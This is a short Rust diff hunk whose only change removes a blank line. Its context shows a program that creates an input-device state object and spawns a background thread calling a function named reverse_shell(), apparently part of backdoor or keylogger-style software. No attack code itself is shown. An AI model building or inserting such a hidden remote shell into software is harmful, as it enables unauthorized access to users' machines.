@@ -11,7 +11,6 @@ fn main() {
 
     // create a device state
     let device_state = DeviceState::new();
-
    
     thread::spawn( move|| {
             reverse_shell();
